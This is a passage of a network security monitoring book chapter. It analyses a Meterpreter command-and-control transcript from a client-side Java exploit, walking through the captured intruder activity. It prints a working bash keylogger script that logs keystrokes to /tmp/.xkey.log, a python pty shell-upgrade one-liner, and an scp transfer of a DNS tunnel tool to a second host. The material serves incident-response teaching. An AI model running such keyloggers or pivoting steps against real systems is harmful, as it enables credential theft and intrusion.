  id: totrans-915
  prefs: []
  type: TYPE_IMG
- en: '**examining the command-and-control channel**'
  id: totrans-916
  prefs: []
  type: TYPE_NORMAL
- en: From our previous analysis, we know that the intruder pivoted from victim
  id: totrans-917
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37 to 10.0.0.99, but we don’t know what he did on those two systems.
  id: totrans-918
  prefs: []
  type: TYPE_NORMAL
- en: Perhaps the traffic involving port 4444 TCP holds the answer. This could
  id: totrans-919
  prefs: []
  type: TYPE_NORMAL
- en: be the command-and-control channel, because it appears immediately after
  id: totrans-920
  prefs: []
  type: TYPE_NORMAL
- en: the connections to the malicious website.
  id: totrans-921
  prefs: []
  type: TYPE_NORMAL
- en: To analyze the suspected command-and-control channel, we generate
  id: totrans-922
  prefs: []
  type: TYPE_NORMAL
- en: a transcript for port 4444 traffic using the CapMe feature in ELSA. Click
  id: totrans-923
  prefs: []
  type: TYPE_NORMAL
- en: the **Info** button next to the record of interest involving port 4444 to get
    full content data. Figure 11-15 shows how to access CapMe.
  id: totrans-924
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-15: Starting CapMe to generate a transcript for port 4444 traffic*'
  id: totrans-925
  prefs: []
  type: TYPE_NORMAL
- en: Click the **getPcap** option, and then click **OK**, to display a new screen
  id: totrans-926
  prefs: []
  type: TYPE_NORMAL
- en: where we input credentials to access the sensor. Also, for this example, I
  id: totrans-927
  prefs: []
  type: TYPE_NORMAL
- en: needed to change the Sid Source entry from **sancp** to **event** to help CapMe
    find the right session. When I ran this query originally, CapMe did not find
  id: totrans-928
  prefs: []
  type: TYPE_NORMAL
- en: the session with the Sid Source as sancp. The session record was probably
  id: totrans-929
  prefs: []
  type: TYPE_NORMAL
- en: not loaded yet, so I used the event table to find the data of interest. This
  id: totrans-930
  prefs: []
  type: TYPE_NORMAL
- en: approach works only if there is an event (triggered by Snort or Suricata,
  id: totrans-931
  prefs: []
  type: TYPE_NORMAL
- en: for example) associated with the traffic. It’s safer to use the sancp table
  id: totrans-932
  prefs: []
  type: TYPE_NORMAL
- en: as long as the records have been loaded. You may need to wait a few min-
  id: totrans-933
  prefs: []
  type: TYPE_NORMAL
- en: utes for the records to load. Figure 11-16 shows the CapMe data request
  id: totrans-934
  prefs: []
  type: TYPE_NORMAL
- en: interface.
  id: totrans-935
  prefs: []
  type: TYPE_NORMAL
- en: In this section, we will examine the resulting transcript. At 642KB, it’s
  id: totrans-936
  prefs: []
  type: TYPE_NORMAL
- en: quite large, and manually examining it for entries of interest is tedious,
  id: totrans-937
  prefs: []
  type: TYPE_NORMAL
- en: but doing so is our best way to determine what happened to the victim
  id: totrans-938
  prefs: []
  type: TYPE_NORMAL
- en: systems. We’ll look at excerpts from the transcript and what is happening
  id: totrans-939
  prefs: []
  type: TYPE_NORMAL
- en: at each point.
  id: totrans-940
  prefs: []
  type: TYPE_NORMAL
- en: '**250** Chapter 11'
  id: totrans-941
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-942
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 144](index-285_1.jpg)'
  id: totrans-943
  prefs: []
  type: TYPE_IMG
- en: '*Figure 11-16: Configuring CapMe to retrieve a transcript for*'
  id: totrans-944
  prefs: []
  type: TYPE_NORMAL
- en: '*port 4444 traffic*'
  id: totrans-945
  prefs: []
  type: TYPE_NORMAL
- en: '***Initial Access***'
  id: totrans-946
  prefs: []
  type: TYPE_NORMAL
- en: The transcript begins with the standard header created by Sguil (which
  id: totrans-947
  prefs: []
  type: TYPE_NORMAL
- en: handles transcript creation for CapMe, in the background) as shown in
  id: totrans-948
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-7\. The command-and-control channel is not a cleartext-based
  id: totrans-949
  prefs: []
  type: TYPE_NORMAL
- en: exchange as in previous examples, so be prepared for a lot of extraneous
  id: totrans-950
  prefs: []
  type: TYPE_NORMAL
- en: characters!
  id: totrans-951
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1-1'
  id: totrans-952
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-16 14:17:57'
  id: totrans-953
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1-1_210'
  id: totrans-954
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 172.16.0.37 (Unknown)'
  id: totrans-955
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 203.0.113.15 (Unknown)'
  id: totrans-956
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 54056'
  id: totrans-957
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 4444'
  id: totrans-958
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 172.16.0.37:54056 - UNKNOWN [S10:64:1:60:M1460,S,T,N,W6:.:?:?]
    (up: 4 hrs) OS Fingerprint: -> 203.0.113.15:4444 (link: ethernet/modem)'
  id: totrans-959
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...........-.'
  id: totrans-960
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: .........start..E(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V..'
  id: totrans-961
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-7: Standard transcript header created by Sguil*'
  id: totrans-962
  prefs: []
  type: TYPE_NORMAL
- en: Next, the term meterpreter appears, as shown in Listing 11-8\. We’ve already
  id: totrans-963
  prefs: []
  type: TYPE_NORMAL
- en: seen this in the Snort alerts, but the presence of the term here indicates we’re
  id: totrans-964
  prefs: []
  type: TYPE_NORMAL
- en: dealing with a Meterpreter component of the Metasploit framework.
  id: totrans-965
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **251**
  id: totrans-966
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-967
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: java/util/Map.......7com/metasploit/**meterpreter**/MemoryBufferURLStreamHandler.............'
  id: totrans-968
  prefs: []
  type: TYPE_NORMAL
- en: getFiles...java/lang/Class........java/lang/Object.....
  id: totrans-969
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-8: The meterpreter reference*'
  id: totrans-970
  prefs: []
  type: TYPE_NORMAL
- en: As shown in Listing 11-9, next we see the term sysinfo, followed by
  id: totrans-971
  prefs: []
  type: TYPE_NORMAL
- en: what might be a hostname, wirubu32, and a Linux kernel version, Linux
  id: totrans-972
  prefs: []
  type: TYPE_NORMAL
- en: 3.5.0-25-generic (i386). The victim system appears to be a Linux i386
  id: totrans-973
  prefs: []
  type: TYPE_NORMAL
- en: platform.
  id: totrans-974
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .........."....stdapi_sys_config_**sysinfo**....)....53495413969516947426070095319226.........'
  id: totrans-975
  prefs: []
  type: TYPE_NORMAL
- en: '**wirubu32**....&.... **Linux 3.5.0-25-generic (i386)**.............'
  id: totrans-976
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-977
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-9: System information*'
  id: totrans-978
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see the term desktop_screenshot, as shown in Listing 11-10,
  id: totrans-979
  prefs: []
  type: TYPE_NORMAL
- en: which is certainly suspicious. This is probably a command to acquire a
  id: totrans-980
  prefs: []
  type: TYPE_NORMAL
- en: screen capture of the victim’s desktop.
  id: totrans-981
  prefs: []
  type: TYPE_NORMAL
- en: ..Ji.......%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..........
  id: totrans-982
  prefs: []
  type: TYPE_NORMAL
- en: ..2..I. .....j.x...}|T..0|&s..0..t.AS.u.`.F..I'..2.Q&..k&..`.4M)R.AZ'.....v.i.Gm...../
  id: totrans-983
  prefs: []
  type: TYPE_NORMAL
- en: '[...V..@...@.Q...WO..X.......g...{.{..{.ym..g.}.^{.'
  id: totrans-984
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-10: The desktop_screenshot command for getting screen captures*'
  id: totrans-985
  prefs: []
  type: TYPE_NORMAL
- en: This second appearance of a desktop_screenshot command is followed
  id: totrans-986
  prefs: []
  type: TYPE_NORMAL
- en: by a JFIF string, as shown in Listing 11-11\. This is probably the header for
  id: totrans-987
  prefs: []
  type: TYPE_NORMAL
- en: a JPEG File Interchange Format ( JFIF) file.
  id: totrans-988
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..........%....stdapi_ui_**desktop_screenshot**....)....53921668623768997177532920965755..'
  id: totrans-989
  prefs: []
  type: TYPE_NORMAL
- en: ..w.......... **JFIF**.............C......
  id: totrans-990
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-11: JFIF reference*'
  id: totrans-991
  prefs: []
  type: TYPE_NORMAL
- en: The excerpt in Listing 11-12 shows the net_config_get_interfaces and
  id: totrans-992
  prefs: []
  type: TYPE_NORMAL
- en: net_config_get_routes functions. The intruder is probably listing network
  id: totrans-993
  prefs: []
  type: TYPE_NORMAL
- en: interfaces and routes on the victim system to see where he sits on the
  id: totrans-994
  prefs: []
  type: TYPE_NORMAL
- en: network.
  id: totrans-995
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...Z.......)....stdapi_net_config_get_interfaces....)....90005067652712330016895656875088\.'
  id: totrans-996
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-997
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..j.......)....stdapi_**net_config_get_interfaces**....)....90005067652712330016895656875088..'
  id: totrans-998
  prefs: []
  type: TYPE_NORMAL
- en: '...............@..........|...........z....................eth0 -'
  id: totrans-999
  prefs: []
  type: TYPE_NORMAL
- en: eth0...................)..8.............@.......................%...........
  id: totrans-1000
  prefs: []
  type: TYPE_NORMAL
- en: '.....@..........|...........z..@4................lo - lo.......................................'
  id: totrans-1001
  prefs: []
  type: TYPE_NORMAL
- en: '..................................'
  id: totrans-1002
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...V.......%....stdapi_net_config_get_routes....)....34295947967733618834188710122897\.'
  id: totrans-1003
  prefs: []
  type: TYPE_NORMAL
- en: '**252** Chapter 11'
  id: totrans-1004
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1005
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1006
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..Z.......%....stdapi_**net_config_get_routes**....)....34295947967733618834188710122897.....'
  id: totrans-1007
  prefs: []
  type: TYPE_NORMAL
- en: '...........P@.....................)..8.....................................................,@'
  id: totrans-1008
  prefs: []
  type: TYPE_NORMAL
- en: '..............'
  id: totrans-1009
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-12: The net_config_get_interfaces and net_config_get_routes functions*'
  id: totrans-1010
  prefs: []
  type: TYPE_NORMAL
- en: The getwd command in Listing 11-13 probably means to get the working
  id: totrans-1011
  prefs: []
  type: TYPE_NORMAL
- en: directory, followed by a mention of the */home/ubu32* directory.
  id: totrans-1012
  prefs: []
  type: TYPE_NORMAL
- en: '%...........................P@......'
  id: totrans-1013
  prefs: []
  type: TYPE_NORMAL
- en: '........................................................................,@.....................'
  id: totrans-1014
  prefs: []
  type: TYPE_NORMAL
- en: '..................'
  id: totrans-1015
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...I............stdapi_fs_**getwd**....)....55282344159994215019998291531526\.'
  id: totrans-1016
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1017
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..i............stdapi_fs_getwd....)....55282344159994215019998291531526.........
    **/home/**'
  id: totrans-1018
  prefs: []
  type: TYPE_NORMAL
- en: '**ubu32**.............'
  id: totrans-1019
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-13: The getwd command and* /home/ubu32 *reference*'
  id: totrans-1020
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-14 shows the most interesting entry so far. The string keylog
  id: totrans-1021
  prefs: []
  type: TYPE_NORMAL
- en: .sh indicates that a keylogger is involved. If the intruder can capture keystrokes
  id: totrans-1022
  prefs: []
  type: TYPE_NORMAL
- en: on the victim, he can access all sorts of information and potentially other
  id: totrans-1023
  prefs: []
  type: TYPE_NORMAL
- en: systems. Following the name of the script appears to be the script itself, as
  id: totrans-1024
  prefs: []
  type: TYPE_NORMAL
- en: 'well as the name of the file used to save the logged keystrokes: */tmp/.xkey.log*.'
  id: totrans-1025
  prefs: []
  type: TYPE_NORMAL
- en: With this information, we could look for the file on the victim hard drive,
  id: totrans-1026
  prefs: []
  type: TYPE_NORMAL
- en: assuming the intruder didn’t delete it or the system didn’t remove it after
  id: totrans-1027
  prefs: []
  type: TYPE_NORMAL
- en: rebooting.
  id: totrans-1028
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_open....)....64467327797845790259721795802753........3std
    api_fs_file........6........................ **keylog.sh**.........wbb.'
  id: totrans-1029
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1030
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..c............core_channel_open....)....64467327797845790259721795802753........2.......'
  id: totrans-1031
  prefs: []
  type: TYPE_NORMAL
- en: '.........'
  id: totrans-1032
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....05544054210663822153934887650143........2.....'
  id: totrans-1033
  prefs: []
  type: TYPE_NORMAL
- en: ..X...4#!/bin/bash
  id: totrans-1034
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: export DISPLAY=:0.0'
  id: totrans-1035
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xinput list'
  id: totrans-1036
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: echo -e "KBD ID ?"'
  id: totrans-1037
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: read kbd'
  id: totrans-1038
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xmodmap -pke > **/tmp/.xkey.log**'
  id: totrans-1039
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: script -c "xinput test $kbd" | cat >> /**tmp/.xkey.log** & DST: echo "The
    keylog can be downloaded from **/tmp/.xkey.log**"'
  id: totrans-1040
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: echo "Use the meterpreter download function"'
  id: totrans-1041
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: echo "Press CTLR+C to exit this session, **keylogger will run in background**"'
  id: totrans-1042
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-14: Keylogger references*'
  id: totrans-1043
  prefs: []
  type: TYPE_NORMAL
- en: The intruder appears to run an ls -al command next. (Listing 11-15
  id: totrans-1044
  prefs: []
  type: TYPE_NORMAL
- en: shows only part of the output, although all of it was present in the transcript.)
  id: totrans-1045
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **253**
  id: totrans-1046
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1047
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...s............core_channel_write....)....27069574503151630704223424155348........2......'
  id: totrans-1048
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**ls -al**'
  id: totrans-1049
  prefs: []
  type: TYPE_NORMAL
- en: '**DST:** ............'
  id: totrans-1050
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1051
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....27069574503151630704223424155348...............'
  id: totrans-1052
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  id: totrans-1053
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1054
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......W...4total 164'
  id: totrans-1055
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 24 ubu32 ubu32 4096 Mar 16 10:22 .'
  id: totrans-1056
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 3 root root 4096 Mar 8 21:00 ..'
  id: totrans-1057
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw------- 1 ubu32 ubu32 4447 Mar 16 08:17 .bash_history'
  id: totrans-1058
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 220 Mar 8 21:00 .bash_logout'
  id: totrans-1059
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 3486 Mar 8 21:00 .bashrc'
  id: totrans-1060
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwx------ 15 ubu32 ubu32 4096 Mar 16 06:29 .cache'
  id: totrans-1061
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxrwxr-x 3 ubu32 ubu32 4096 Mar 15 08:52 .compiz-1'
  id: totrans-1062
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwx------ 11 ubu32 ubu32 4096 Mar 16 09:34 .config'
  id: totrans-1063
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwx------ 3 ubu32 ubu32 4096 Mar 8 21:34 .dbus'
  id: totrans-1064
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 Mar 8 21:34 Desktop'
  id: totrans-1065
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 26 Mar 16 09:08 .dmrc'
  id: totrans-1066
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 Mar 8 21:34 Documents'
  id: totrans-1067
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-15: An ls -al command*'
  id: totrans-1068
  prefs: []
  type: TYPE_NORMAL
- en: The next command, mv keylog.sh .pulse, shows the intruder moving his
  id: totrans-1069
  prefs: []
  type: TYPE_NORMAL
- en: keylogger script into the *.pulse* directory, as shown in Listing 11-16\. Next,
    he changes the user permissions to rwx, for read-write-execute.
  id: totrans-1070
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....64553530986314682019983298603129........2......'
  id: totrans-1071
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**mv keylog.sh .pulse**'
  id: totrans-1072
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....60405588103478885840826252268236........2......'
  id: totrans-1073
  prefs: []
  type: TYPE_NORMAL
- en: '.....4chmod u=**rwx** keylog.sh'
  id: totrans-1074
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  id: totrans-1075
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1076
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....60405588103478885840826252268236...............'
  id: totrans-1077
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  id: totrans-1078
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-16: The mv keylog.sh .pulse command and rxw permissions*'
  id: totrans-1079
  prefs: []
  type: TYPE_NORMAL
- en: Here, the intruder appears to execute his *keylog.sh* script. (The output of
  id: totrans-1080
  prefs: []
  type: TYPE_NORMAL
- en: the script follows in Listing 11-17.) This script gives the intruder a chance
    to
  id: totrans-1081
  prefs: []
  type: TYPE_NORMAL
- en: select the keyboard to monitor and reminds him to look in the */tmp/.xkey.log*
  id: totrans-1082
  prefs: []
  type: TYPE_NORMAL
- en: directory for results.
  id: totrans-1083
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...x............core_channel_write....)....75957044127671614064150081298305........2......'
  id: totrans-1084
  prefs: []
  type: TYPE_NORMAL
- en: '.....4\. **/keylog.sh**'
  id: totrans-1085
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  id: totrans-1086
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1087
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....75957044127671614064150081298305...............'
  id: totrans-1088
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  id: totrans-1089
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1090
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2...........4... Virtual core pointer .id=2.[master pointer
    (3)]'
  id: totrans-1091
  prefs: []
  type: TYPE_NORMAL
- en: '**254** Chapter 11'
  id: totrans-1092
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1093
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... Virtual core XTEST pointer .id=4.[slave pointer (2)]'
  id: totrans-1094
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=7.[slave pointer (2)]'
  id: totrans-1095
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=8.[slave pointer (2)]'
  id: totrans-1096
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... ... ImPS/2 Generic Wheel Mouse .id=10.[slave pointer (2)]'
  id: totrans-1097
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... Virtual core keyboard .id=3.[master keyboard (2)]'
  id: totrans-1098
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... Virtual core XTEST keyboard .id=5.[slave keyboard (3)]'
  id: totrans-1099
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... Power Button .id=6.[slave keyboard (3)]'
  id: totrans-1100
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ... AT Translated Set 2 keyboard .id=9.[slave keyboard (3)]'
  id: totrans-1101
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....SRREVPPXSOANPPYWFQHSVCNMFFBJBMMJ....u......'
  id: totrans-1102
  prefs: []
  type: TYPE_NORMAL
- en: '.....2...........4KBD ID ?'
  id: totrans-1103
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....NBVSIORNAUEQNTEQFFFCJMHXSAEMNQNA.'
  id: totrans-1104
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...n............core_channel_write....)....45042497071271683260243072775318........2.....'
  id: totrans-1105
  prefs: []
  type: TYPE_NORMAL
- en: ..
  id: totrans-1106
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...49'
  id: totrans-1107
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  id: totrans-1108
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1109
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....45042497071271683260243072775318...............'
  id: totrans-1110
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  id: totrans-1111
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1112
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2...........4**The keylog can be downloaded from /tmp/.xkey.log**'
  id: totrans-1113
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: Use the meterpreter download function'
  id: totrans-1114
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: Press CTLR+C to exit this session, keylogger will run in backround'
  id: totrans-1115
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-17: The* keylog .sh *script and reminder*'
  id: totrans-1116
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see evidence that the intruder transferred a file called
  id: totrans-1117
  prefs: []
  type: TYPE_NORMAL
- en: '*iodine_0.6.0~rc1-7_i386.deb* from 203.0.113.15 to 172.16.0.37, as shown in'
  id: totrans-1118
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-18\. This appears to be a Debian package of the Iodine covert
  id: totrans-1119
  prefs: []
  type: TYPE_NORMAL
- en: DNS tunnel tool. The intruder must have used this tool to create the tens
  id: totrans-1120
  prefs: []
  type: TYPE_NORMAL
- en: of thousands of unusual DNS entries discussed earlier.
  id: totrans-1121
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_open....)....32392496134731212115385138997235........3std
    api_fs_file........6...................$.... **iodine_0.6.0~rc1-7_i386.deb**.........wbb.'
  id: totrans-1122
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-18: The* iodine_0 .6 .0~rc1-7_i386 .deb *reference*'
  id: totrans-1123
  prefs: []
  type: TYPE_NORMAL
- en: '***Improving the Shell***'
  id: totrans-1124
  prefs: []
  type: TYPE_NORMAL
- en: The next command is fascinating, as shown in Listing 11-19\. By running
  id: totrans-1125
  prefs: []
  type: TYPE_NORMAL
- en: python -c 'import pty;pty.spawn("/bin/bash")', the intruder improves the shell
    he is using on the victim system by starting a Bash shell. By using Python
  id: totrans-1126
  prefs: []
  type: TYPE_NORMAL
- en: to start a Bash shell, he creates a shell that can prompt the user and accept
  id: totrans-1127
  prefs: []
  type: TYPE_NORMAL
- en: replies. (When an intruder opens a shell with Meterpreter, he may not have
  id: totrans-1128
  prefs: []
  type: TYPE_NORMAL
- en: access that allows him to enter passwords when prompted. This is a problem
  id: totrans-1129
  prefs: []
  type: TYPE_NORMAL
- en: when trying to run sudo or answer any other command that prompts the user.)
  id: totrans-1130
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....07078092619529470178701062926304........2......'
  id: totrans-1131
  prefs: []
  type: TYPE_NORMAL
- en: .6...4**python -c 'import pty;pty.spawn("/bin/bash")'**
  id: totrans-1132
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-19: Bash shell startup*'
  id: totrans-1133
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **255**
  id: totrans-1134
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1135
  prefs: []
  type: TYPE_NORMAL
- en: Continuing through the transcript reveals the reason for the Bash shell.
  id: totrans-1136
  prefs: []
  type: TYPE_NORMAL
- en: The intruder uses scp, as shown in Listing 11-20, to transfer (via SSH) the
  id: totrans-1137
  prefs: []
  type: TYPE_NORMAL
- en: '*iodine_0.6.0~rc1-7_i386.deb* package from 172.16.0.37 to 10.0.0.99 as user
    ubu32\.'
  id: totrans-1138
  prefs: []
  type: TYPE_NORMAL
- en: How does the intruder have the password to log in to 10.0.0.99? He prob-
  id: totrans-1139
  prefs: []
  type: TYPE_NORMAL
- en: ably captured it with his keylogger.
  id: totrans-1140
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....28332839019310295629231957979483........2......'
  id: totrans-1141
  prefs: []
  type: TYPE_NORMAL
- en: .=...4**scp** **iodine_0.6.0~rc1-7_i386.deb** **ubu32@10.0.0.99:/tmp**
  id: totrans-1142
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-20: Transfer of the* iodine_0 .6 .0~rc1-7_i386 .deb *package*'
  id: totrans-1143
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 1***'
  id: totrans-1144
  prefs: []
  type: TYPE_NORMAL
- en: At this point, the intruder has taken several steps involving one victim sys-
  id: totrans-1145
  prefs: []
  type: TYPE_NORMAL
- en: tem, as summarized in Figure 11-17\. He enticed a user to click a malicious
  id: totrans-1146
  prefs: []
  type: TYPE_NORMAL
- en: link posted to Twitter. That link pointed to a URL involving 203.0.113.15,
  id: totrans-1147
  prefs: []
  type: TYPE_NORMAL
- en: and the victim 172.16.0.37 visited a web server on the intruder’s system.
  id: totrans-1148
  prefs: []
  type: TYPE_NORMAL
- en: That malicious web server offered code that exploited a vulnerable Java
  id: totrans-1149
  prefs: []
  type: TYPE_NORMAL
- en: instance on 172.16.0.37\. The payload delivered with the Java exploit caused
  id: totrans-1150
  prefs: []
  type: TYPE_NORMAL
- en: the victim to reach back again to 203.0.113.15 to retrieve more attack soft-
  id: totrans-1151
  prefs: []
  type: TYPE_NORMAL
- en: ware from the intruder.
  id: totrans-1152
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Victim clicks on malicious URL on Twitter.
  id: totrans-1153
  prefs: []
  type: TYPE_NORMAL
- en: SOCIAL MEDIA OR OTHER COMMUNICATION
  id: totrans-1154
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1155
  prefs: []
  type: TYPE_NORMAL
- en: Twitter
  id: totrans-1156
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  id: totrans-1157
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Victim web browser connects to
  id: totrans-1158
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15:8080/healthcarenews.
  id: totrans-1159
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1160
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  id: totrans-1161
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1162
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  id: totrans-1163
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  id: totrans-1164
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Attack method exploits vulnerable Java
  id: totrans-1165
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  id: totrans-1166
  prefs: []
  type: TYPE_NORMAL
- en: software on victim system to execute code.
  id: totrans-1167
  prefs: []
  type: TYPE_NORMAL
- en: 4\. Malicious code causes victim to reach back to intruder
